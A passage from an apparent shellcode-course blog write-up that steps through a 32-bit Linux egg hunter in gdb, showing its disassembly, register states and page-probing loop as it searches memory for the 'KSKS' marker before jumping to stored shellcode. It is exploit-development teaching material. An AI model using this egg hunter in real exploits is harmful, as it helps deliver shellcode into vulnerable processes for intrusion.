</code></pre></div> <h3 id="stepping-through-the-execution">Stepping through the execution</h3> <p>A hook-stop has been defined to keep an eye on the state of the different general purpose registers, eflags as well as the contents of the <code class="highlighter-rouge">EDI</code> register</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="n">skawa</span><span class="err">@</span><span class="n">ubuntu</span><span class="o">:~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">assignment</span><span class="o">/</span><span class="n">assignment3</span><span class="err">$</span> <span class="n">gdb</span> <span class="o">-</span><span class="n">q</span> <span class="p">.</span><span class="o">/</span><span class="n">shellcode</span>
<span class="n">Reading</span> <span class="n">symbols</span> <span class="n">from</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">skawa</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">assignment</span><span class="o">/</span><span class="n">assignment3</span><span class="o">/</span><span class="n">shellcode</span><span class="p">...(</span><span class="n">no</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span><span class="p">)...</span><span class="n">done</span><span class="p">.</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">break</span> <span class="o">*&amp;</span><span class="n">egg_hunter</span>
<span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x804a060</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">run</span>
<span class="n">Starting</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">skawa</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">assignment</span><span class="o">/</span><span class="n">assignment3</span><span class="o">/</span><span class="n">shellcode</span>
<span class="err">[</span><span class="o">+</span><span class="err">]</span> <span class="n">Searching</span> <span class="n">for</span><span class="o">:</span> <span class="n">KSKS</span>
<span class="err">[</span><span class="o">+</span><span class="err">]</span> <span class="n">Egg</span> <span class="n">Hunter</span> <span class="n">Length</span><span class="o">:</span> <span class="mi">16</span>
<span class="err">[</span><span class="o">+</span><span class="err">]</span> <span class="n">Shellcode</span> <span class="n">Length</span><span class="o">:</span> <span class="mi">33</span>

<span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x0804a060</span> <span class="k">in</span> <span class="n">egg_hunter</span> <span class="p">()</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">define</span> <span class="n">hook</span><span class="o">-</span><span class="n">stop</span>
<span class="n">Type</span> <span class="n">commands</span> <span class="n">for</span> <span class="n">definition</span> <span class="n">of</span> <span class="s">"hook-stop"</span><span class="p">.</span>
<span class="n">End</span> <span class="n">with</span> <span class="n">a</span> <span class="n">line</span> <span class="n">saying</span> <span class="n">just</span> <span class="s">"end"</span><span class="p">.</span>
<span class="o">&gt;</span><span class="n">print</span><span class="o">/</span><span class="n">x</span> <span class="err">$</span><span class="n">eax</span>
<span class="o">&gt;</span><span class="n">print</span><span class="o">/</span><span class="n">x</span> <span class="err">$</span><span class="n">ebx</span>
<span class="o">&gt;</span><span class="n">print</span><span class="o">/</span><span class="n">x</span> <span class="err">$</span><span class="n">edx</span>
<span class="o">&gt;</span><span class="n">print</span><span class="o">/</span><span class="n">x</span> <span class="err">$</span><span class="n">edi</span>
<span class="o">&gt;</span><span class="n">x</span><span class="o">/</span><span class="mi">4</span><span class="n">bx</span> <span class="err">$</span><span class="n">edi</span>
<span class="o">&gt;</span><span class="n">i</span> <span class="n">r</span> <span class="n">eflags</span>
<span class="o">&gt;</span><span class="n">disas</span>
<span class="o">&gt;</span><span class="n">end</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">stepi</span>
<span class="err">$</span><span class="mi">1</span> <span class="o">=</span> <span class="mh">0x804a060</span>
<span class="err">$</span><span class="mi">2</span> <span class="o">=</span> <span class="mh">0xb7fc6ff4</span>
<span class="err">$</span><span class="mi">3</span> <span class="o">=</span> <span class="mh">0x0</span>
<span class="err">$</span><span class="mi">4</span> <span class="o">=</span> <span class="mh">0x804a0c2</span>
<span class="mh">0x804a0c2</span><span class="o">:</span>	<span class="mh">0x00</span>	<span class="mh">0x00</span>	<span class="mh">0x00</span>	<span class="mh">0x00</span>
<span class="n">eflags</span>         <span class="mh">0x282</span>	<span class="err">[</span> <span class="n">SF</span> <span class="n">IF</span> <span class="err">]</span>
<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">egg_hunter</span><span class="o">:</span>
   <span class="mh">0x0804a060</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="k">cld</span>    
<span class="o">=&gt;</span> <span class="mh">0x0804a061</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
   <span class="mh">0x0804a063</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">edx</span><span class="p">,</span><span class="n">edx</span>
   <span class="mh">0x0804a065</span> <span class="o">&lt;+</span><span class="mi">5</span><span class="o">&gt;:</span>	<span class="k">or</span>     <span class="n">dx</span><span class="p">,</span><span class="mh">0xfff</span>
   <span class="mh">0x0804a06a</span> <span class="o">&lt;+</span><span class="mi">10</span><span class="o">&gt;:</span>	<span class="k">inc</span>    <span class="n">edx</span>
   <span class="mh">0x0804a06b</span> <span class="o">&lt;+</span><span class="mi">11</span><span class="o">&gt;:</span>	<span class="k">lea</span>    <span class="n">ebx</span><span class="p">,</span><span class="err">[</span><span class="n">edx</span><span class="o">+</span><span class="mh">0x4</span><span class="err">]</span>
   <span class="mh">0x0804a06e</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x21</span>
   <span class="mh">0x0804a073</span> <span class="o">&lt;+</span><span class="mi">19</span><span class="o">&gt;:</span>	<span class="k">int</span>    <span class="mh">0x80</span>
   <span class="mh">0x0804a075</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0xf2</span>
   <span class="mh">0x0804a077</span> <span class="o">&lt;+</span><span class="mi">23</span><span class="o">&gt;:</span>	<span class="k">je</span>     <span class="mh">0x804a065</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">5</span><span class="o">&gt;</span>
   <span class="mh">0x0804a079</span> <span class="o">&lt;+</span><span class="mi">25</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x534b534b</span>
   <span class="mh">0x0804a07e</span> <span class="o">&lt;+</span><span class="mi">30</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="n">edx</span>
   <span class="mh">0x0804a080</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;:</span>	<span class="n">scas</span>   <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">es</span><span class="o">:</span><span class="p">[edi]</span>
   <span class="mh">0x0804a081</span> <span class="o">&lt;+</span><span class="mi">33</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x804a06a</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span>
   <span class="mh">0x0804a083</span> <span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;:</span>	<span class="n">scas</span>   <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">es</span><span class="o">:</span><span class="p">[edi]</span>
   <span class="mh">0x0804a084</span> <span class="o">&lt;+</span><span class="mi">36</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x804a06a</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span>
   <span class="mh">0x0804a086</span> <span class="o">&lt;+</span><span class="mi">38</span><span class="o">&gt;:</span>	<span class="k">jmp</span>    <span class="n">edi</span>
   <span class="mh">0x0804a088</span> <span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[eax],</span><span class="n">al</span>
<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
<span class="mh">0x0804a061</span> <span class="k">in</span> <span class="n">egg_hunter</span> <span class="p">()</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span>
</code></pre></div> <p>As mentioned, the first virtual address space of relevance is typically <code class="highlighter-rouge">0x8048000</code>, however this egg hunter does not assume that the virtual memory address space for the given process follows conventional means. As such, the first address that is examined is <code class="highlighter-rouge">0x0001000</code>.</p> <p>The following disassembly just displays how the page alignment occurs. Until a valid address is located, such as <code class="highlighter-rouge">0x8048000</code>, the comparison of <code class="highlighter-rouge">AL</code> and the lower byte of the <code class="highlighter-rouge">EFAULT</code> flag will always result in the zero flag being set, directing the execution of the process back to the page alignment instruction <code class="highlighter-rouge">dx,0xfff</code> and incrementing <code class="highlighter-rouge">EBX</code> and <code class="highlighter-rouge">EBX</code> by page sizes.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">break</span> <span class="o">*</span><span class="mh">0x0804a075</span>
<span class="n">Breakpoint</span> <span class="mi">2</span> <span class="n">at</span> <span class="mh">0x804a075</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
<span class="n">Continuing</span><span class="p">.</span>
<span class="err">$</span><span class="mi">5</span> <span class="o">=</span> <span class="mh">0xfffffff2</span>
<span class="err">$</span><span class="mi">6</span> <span class="o">=</span> <span class="mh">0x1004</span>
<span class="err">$</span><span class="mi">7</span> <span class="o">=</span> <span class="mh">0x1000</span>
<span class="err">$</span><span class="mi">8</span> <span class="o">=</span> <span class="mh">0x804a0c2</span>
<span class="mh">0x804a0c2</span><span class="o">:</span>	<span class="mh">0x00</span>	<span class="mh">0x00</span>	<span class="mh">0x00</span>	<span class="mh">0x00</span>
<span class="n">eflags</span>         <span class="mh">0x216</span>	<span class="err">[</span> <span class="n">PF</span> <span class="n">AF</span> <span class="n">IF</span> <span class="err">]</span>
<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">egg_hunter</span><span class="o">:</span>
   <span class="mh">0x0804a060</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="k">cld</span>    
   <span class="mh">0x0804a061</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
   <span class="mh">0x0804a063</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">edx</span><span class="p">,</span><span class="n">edx</span>
   <span class="mh">0x0804a065</span> <span class="o">&lt;+</span><span class="mi">5</span><span class="o">&gt;:</span>	<span class="k">or</span>     <span class="n">dx</span><span class="p">,</span><span class="mh">0xfff</span>
   <span class="mh">0x0804a06a</span> <span class="o">&lt;+</span><span class="mi">10</span><span class="o">&gt;:</span>	<span class="k">inc</span>    <span class="n">edx</span>
   <span class="mh">0x0804a06b</span> <span class="o">&lt;+</span><span class="mi">11</span><span class="o">&gt;:</span>	<span class="k">lea</span>    <span class="n">ebx</span><span class="p">,</span><span class="err">[</span><span class="n">edx</span><span class="o">+</span><span class="mh">0x4</span><span class="err">]</span>
   <span class="mh">0x0804a06e</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x21</span>
   <span class="mh">0x0804a073</span> <span class="o">&lt;+</span><span class="mi">19</span><span class="o">&gt;:</span>	<span class="k">int</span>    <span class="mh">0x80</span>
<span class="o">=&gt;</span> <span class="mh">0x0804a075</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0xf2</span>
   <span class="mh">0x0804a077</span> <span class="o">&lt;+</span><span class="mi">23</span><span class="o">&gt;:</span>	<span class="k">je</span>     <span class="mh">0x804a065</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">5</span><span class="o">&gt;</span>
   <span class="mh">0x0804a079</span> <span class="o">&lt;+</span><span class="mi">25</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x534b534b</span>
   <span class="mh">0x0804a07e</span> <span class="o">&lt;+</span><span class="mi">30</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="n">edx</span>
   <span class="mh">0x0804a080</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;:</span>	<span class="n">scas</span>   <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">es</span><span class="o">:</span><span class="p">[edi]</span>
   <span class="mh">0x0804a081</span> <span class="o">&lt;+</span><span class="mi">33</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x804a06a</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span>
   <span class="mh">0x0804a083</span> <span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;:</span>	<span class="n">scas</span>   <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">es</span><span class="o">:</span><span class="p">[edi]</span>
   <span class="mh">0x0804a084</span> <span class="o">&lt;+</span><span class="mi">36</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x804a06a</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span>
   <span class="mh">0x0804a086</span> <span class="o">&lt;+</span><span class="mi">38</span><span class="o">&gt;:</span>	<span class="k">jmp</span>    <span class="n">edi</span>
   <span class="mh">0x0804a088</span> <span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[eax],</span><span class="n">al</span>
<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>

<span class="n">Breakpoint</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x0804a075</span> <span class="k">in</span> <span class="n">egg_hunter</span> <span class="p">()</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span>
<span class="n">Continuing</span><span class="p">.</span>
<span class="err">$</span><span class="mi">9</span> <span class="o">=</span> <span class="mh">0xfffffff2</span>
<span class="err">$</span><span class="mi">10</span> <span class="o">=</span> <span class="mh">0x2004</span>
<span class="err">$</span><span class="mi">11</span> <span class="o">=</span> <span class="mh">0x2000</span>
<span class="err">$</span><span class="mi">12</span> <span class="o">=</span> <span class="mh">0x804a0c2</span>
<span class="mh">0x804a0c2</span><span class="o">:</span>	<span class="mh">0x00</span>	<span class="mh">0x00</span>	<span class="mh">0x00</span>	<span class="mh">0x00</span>
<span class="n">eflags</span>         <span class="mh">0x216</span>	<span class="err">[</span> <span class="n">PF</span> <span class="n">AF</span> <span class="n">IF</span> <span class="err">]</span>
<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">egg_hunter</span><span class="o">:</span>
   <span class="mh">0x0804a060</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="k">cld</span>    
   <span class="mh">0x0804a061</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
   <span class="mh">0x0804a063</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">edx</span><span class="p">,</span><span class="n">edx</span>
   <span class="mh">0x0804a065</span> <span class="o">&lt;+</span><span class="mi">5</span><span class="o">&gt;:</span>	<span class="k">or</span>     <span class="n">dx</span><span class="p">,</span><span class="mh">0xfff</span>
   <span class="mh">0x0804a06a</span> <span class="o">&lt;+</span><span class="mi">10</span><span class="o">&gt;:</span>	<span class="k">inc</span>    <span class="n">edx</span>
   <span class="mh">0x0804a06b</span> <span class="o">&lt;+</span><span class="mi">11</span><span class="o">&gt;:</span>	<span class="k">lea</span>    <span class="n">ebx</span><span class="p">,</span><span class="err">[</span><span class="n">edx</span><span class="o">+</span><span class="mh">0x4</span><span class="err">]</span>
   <span class="mh">0x0804a06e</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x21</span>
   <span class="mh">0x0804a073</span> <span class="o">&lt;+</span><span class="mi">19</span><span class="o">&gt;:</span>	<span class="k">int</span>    <span class="mh">0x80</span>
<span class="o">=&gt;</span> <span class="mh">0x0804a075</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0xf2</span>
   <span class="mh">0x0804a077</span> <span class="o">&lt;+</span><span class="mi">23</span><span class="o">&gt;:</span>	<span class="k">je</span>     <span class="mh">0x804a065</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">5</span><span class="o">&gt;</span>
   <span class="mh">0x0804a079</span> <span class="o">&lt;+</span><span class="mi">25</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x534b534b</span>
   <span class="mh">0x0804a07e</span> <span class="o">&lt;+</span><span class="mi">30</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="n">edx</span>
   <span class="mh">0x0804a080</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;:</span>	<span class="n">scas</span>   <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">es</span><span class="o">:</span><span class="p">[edi]</span>
   <span class="mh">0x0804a081</span> <span class="o">&lt;+</span><span class="mi">33</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x804a06a</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span>
   <span class="mh">0x0804a083</span> <span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;:</span>	<span class="n">scas</span>   <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">es</span><span class="o">:</span><span class="p">[edi]</span>
   <span class="mh">0x0804a084</span> <span class="o">&lt;+</span><span class="mi">36</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x804a06a</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span>
   <span class="mh">0x0804a086</span> <span class="o">&lt;+</span><span class="mi">38</span><span class="o">&gt;:</span>	<span class="k">jmp</span>    <span class="n">edi</span>
   <span class="mh">0x0804a088</span> <span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[eax],</span><span class="n">al</span>
<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>

<span class="n">Breakpoint</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x0804a075</span> <span class="k">in</span> <span class="n">egg_hunter</span> <span class="p">()</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span>
<span class="n">Continuing</span><span class="p">.</span>
<span class="err">$</span><span class="mi">13</span> <span class="o">=</span> <span class="mh">0xfffffff2</span>
<span class="err">$</span><span class="mi">14</span> <span class="o">=</span> <span class="mh">0x3004</span>
<span class="err">$</span><span class="mi">15</span> <span class="o">=</span> <span class="mh">0x3000</span>
<span class="err">$</span><span class="mi">16</span> <span class="o">=</span> <span class="mh">0x804a0c2</span>
<span class="mh">0x804a0c2</span><span class="o">:</span>	<span class="mh">0x00</span>	<span class="mh">0x00</span>	<span class="mh">0x00</span>	<span class="mh">0x00</span>
<span class="n">eflags</span>         <span class="mh">0x216</span>	<span class="err">[</span> <span class="n">PF</span> <span class="n">AF</span> <span class="n">IF</span> <span class="err">]</span>
<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">egg_hunter</span><span class="o">:</span>
   <span class="mh">0x0804a060</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="k">cld</span>    
   <span class="mh">0x0804a061</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
   <span class="mh">0x0804a063</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">edx</span><span class="p">,</span><span class="n">edx</span>
   <span class="mh">0x0804a065</span> <span class="o">&lt;+</span><span class="mi">5</span><span class="o">&gt;:</span>	<span class="k">or</span>     <span class="n">dx</span><span class="p">,</span><span class="mh">0xfff</span>
   <span class="mh">0x0804a06a</span> <span class="o">&lt;+</span><span class="mi">10</span><span class="o">&gt;:</span>	<span class="k">inc</span>    <span class="n">edx</span>
   <span class="mh">0x0804a06b</span> <span class="o">&lt;+</span><span class="mi">11</span><span class="o">&gt;:</span>	<span class="k">lea</span>    <span class="n">ebx</span><span class="p">,</span><span class="err">[</span><span class="n">edx</span><span class="o">+</span><span class="mh">0x4</span><span class="err">]</span>
   <span class="mh">0x0804a06e</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x21</span>
   <span class="mh">0x0804a073</span> <span class="o">&lt;+</span><span class="mi">19</span><span class="o">&gt;:</span>	<span class="k">int</span>    <span class="mh">0x80</span>
<span class="o">=&gt;</span> <span class="mh">0x0804a075</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0xf2</span>
   <span class="mh">0x0804a077</span> <span class="o">&lt;+</span><span class="mi">23</span><span class="o">&gt;:</span>	<span class="k">je</span>     <span class="mh">0x804a065</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">5</span><span class="o">&gt;</span>
   <span class="mh">0x0804a079</span> <span class="o">&lt;+</span><span class="mi">25</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x534b534b</span>
   <span class="mh">0x0804a07e</span> <span class="o">&lt;+</span><span class="mi">30</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="n">edx</span>
   <span class="mh">0x0804a080</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;:</span>	<span class="n">scas</span>   <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">es</span><span class="o">:</span><span class="p">[edi]</span>
   <span class="mh">0x0804a081</span> <span class="o">&lt;+</span><span class="mi">33</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x804a06a</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span>
   <span class="mh">0x0804a083</span> <span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;:</span>	<span class="n">scas</span>   <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">es</span><span class="o">:</span><span class="p">[edi]</span>
   <span class="mh">0x0804a084</span> <span class="o">&lt;+</span><span class="mi">36</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x804a06a</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span>
   <span class="mh">0x0804a086</span> <span class="o">&lt;+</span><span class="mi">38</span><span class="o">&gt;:</span>	<span class="k">jmp</span>    <span class="n">edi</span>
   <span class="mh">0x0804a088</span> <span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[eax],</span><span class="n">al</span>
<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>

<span class="n">Breakpoint</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x0804a075</span> <span class="k">in</span> <span class="n">egg_hunter</span> <span class="p">()</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span>
</code></pre></div> <p>The following disassembly displays the first valid address that has been located by the <code class="highlighter-rouge">access</code> system call this is <code class="highlighter-rouge">0x8048004</code>.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">del</span> <span class="mi">2</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">break</span> <span class="o">*</span><span class="mh">0x0804a079</span>
<span class="n">Breakpoint</span> <span class="mi">3</span> <span class="n">at</span> <span class="mh">0x804a079</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
<span class="n">Continuing</span><span class="p">.</span>
<span class="err">$</span><span class="mi">65</span> <span class="o">=</span> <span class="mh">0xfffffffe</span>
<span class="err">$</span><span class="mi">66</span> <span class="o">=</span> <span class="mh">0x8048004</span>
<span class="err">$</span><span class="mi">67</span> <span class="o">=</span> <span class="mh">0x8048000</span>
<span class="err">$</span><span class="mi">68</span> <span class="o">=</span> <span class="mh">0x804a0c2</span>
<span class="mh">0x804a0c2</span><span class="o">:</span>	<span class="mh">0x00</span>	<span class="mh">0x00</span>	<span class="mh">0x00</span>	<span class="mh">0x00</span>
<span class="n">eflags</span>         <span class="mh">0x206</span>	<span class="err">[</span> <span class="n">PF</span> <span class="n">IF</span> <span class="err">]</span>
<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">egg_hunter</span><span class="o">:</span>
   <span class="mh">0x0804a060</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="k">cld</span>    
   <span class="mh">0x0804a061</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
   <span class="mh">0x0804a063</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">edx</span><span class="p">,</span><span class="n">edx</span>
   <span class="mh">0x0804a065</span> <span class="o">&lt;+</span><span class="mi">5</span><span class="o">&gt;:</span>	<span class="k">or</span>     <span class="n">dx</span><span class="p">,</span><span class="mh">0xfff</span>
   <span class="mh">0x0804a06a</span> <span class="o">&lt;+</span><span class="mi">10</span><span class="o">&gt;:</span>	<span class="k">inc</span>    <span class="n">edx</span>
   <span class="mh">0x0804a06b</span> <span class="o">&lt;+</span><span class="mi">11</span><span class="o">&gt;:</span>	<span class="k">lea</span>    <span class="n">ebx</span><span class="p">,</span><span class="err">[</span><span class="n">edx</span><span class="o">+</span><span class="mh">0x4</span><span class="err">]</span>
   <span class="mh">0x0804a06e</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x21</span>
   <span class="mh">0x0804a073</span> <span class="o">&lt;+</span><span class="mi">19</span><span class="o">&gt;:</span>	<span class="k">int</span>    <span class="mh">0x80</span>
   <span class="mh">0x0804a075</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0xf2</span>
   <span class="mh">0x0804a077</span> <span class="o">&lt;+</span><span class="mi">23</span><span class="o">&gt;:</span>	<span class="k">je</span>     <span class="mh">0x804a065</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">5</span><span class="o">&gt;</span>
<span class="o">=&gt;</span> <span class="mh">0x0804a079</span> <span class="o">&lt;+</span><span class="mi">25</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x534b534b</span>
   <span class="mh">0x0804a07e</span> <span class="o">&lt;+</span><span class="mi">30</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="n">edx</span>
   <span class="mh">0x0804a080</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;:</span>	<span class="n">scas</span>   <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">es</span><span class="o">:</span><span class="p">[edi]</span>
